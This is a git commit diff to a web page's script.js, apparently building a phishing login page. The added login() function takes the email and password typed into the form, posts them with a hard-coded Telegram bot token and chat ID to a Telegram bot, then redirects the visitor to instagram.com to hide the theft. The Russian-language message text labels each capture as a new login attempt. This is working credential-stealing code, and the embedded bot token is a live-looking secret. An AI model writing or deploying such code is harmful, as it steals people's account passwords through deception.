2568d9aed3167c5173bde16347ee3e63c154f5ae
ismail <ismailabbasov920@gmail.com>
2025-05-08 19:52:30 +0500

    page

--- script.js
+++ script.js
@@ -1,17 +1,30 @@
-const userEmail = 'Exwisma';
-const userPassword = '1234567890';
-
-
-
-
 function login() {
-const email = document.getElementById('userEmail').value
-const password = document.getElementById('userPassword').value
-
-if(userEmail === email && userPassword === password){
-    window.location.href = 'login.html'
-}  
-else(
- alert('у вас не правильный пароль или лагин')
-)
-}
+    const email = document.getElementById('userEmail').value;
+    const password = document.getElementById('userPassword').value;
+  
+    const botToken = '8061491054:AAHWyMh_lqcMXcPipErffuq9mXZmcoyLBkk';
+    const chatId = '758234437'; // ← сюда нужно вставить свой chat_id
+  
+    const message = `🔐 Новая попытка входа:\n👤 Логин: ${email}\n🔑 Пароль: ${password}`;
+  
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        window.location.href = 'https://instagram.com';
+      } else {
+        alert('Ошибка отправки!');
+      }
+    })
+    .catch(error => {
+      alert('Ошибка: ' + error);
+    });
+  }
